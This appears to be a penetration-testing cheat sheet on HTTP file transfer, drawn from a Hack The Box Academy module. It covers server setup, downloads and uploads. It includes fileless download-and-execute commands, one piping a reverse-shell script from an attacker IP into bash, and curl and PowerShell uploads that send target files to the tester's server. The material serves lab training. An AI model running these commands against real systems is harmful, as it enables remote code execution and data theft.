Very Convenient if its not blocked, one of my goto alongside SMB

Preparation:

-Setting up a https server using goshs(up/download, basic-auth, first)
```
goshs -s -ss -b 'username:password' -p <port>
```
-Setting up a http server using goshs(up/download, choose if cant ignore cert error)
```
goshs -p <port>
``` 
-Setting up a http download server using python (deprecated, download only, use if goshs fail)
```
python -m http.server <port>
```
-Setting up a http upload server using python (deprecated, upload only, use only if goshs fail)
```
python3 -m uploadserver
```

Downloading:

-Using curl to download file (both-platform)
```
curl -o <desired_fname> http(s)://<url>
```
-Using wget on linux
```
wget http(s)://<url>
```
-Using wget on powershell
```
wget "http(s)://<url>" -OutFile "<path_to_output>" -UseBasicParsing
#Add -UseBasicParsing if target Internet Explorer first-launch configuration has not yet been completed 
```
-Using Net.WebClient(Powershell)
```
(New-Object Net.WebClient).DownloadFile('<Target File URL>, '<Output File Name>')
#or
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>, '<Output File Name>')
```
-Fileless Download and execution (Powershell)
```
IEX (New-Object Net.WebClient).DownloadString('<URL>')
#This method is good if we need not the file to touch the FS (Example: Reverse shell payload)
```
-Fileless Download and execution (Linux)
```
wget http(s)://<url> | <shell/interpreter>
#above can also be used with curl, <shell/interpreter> depends on what is responsible to execute the file downloaded
#Example
wget http://10.10.16.177/RevShell.sh | bash
```
-Uploading file from powershell (Require PSUpload.ps1 - https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)
```
(New-Object Net.WebClient).UploadFile('http(s)://<ip>/', '<fname>')
```

-Uploading File to our goshs /python upload server(Linux):
```
curl -X POST http://<SERVER_IP>:<PORT>/upload -F "files=@/path/to/your/file.txt"
#change http to https and add --insecure flag if goshs in https
```

Ref: https://academy.hackthebox.com/app/module/24/section/514 /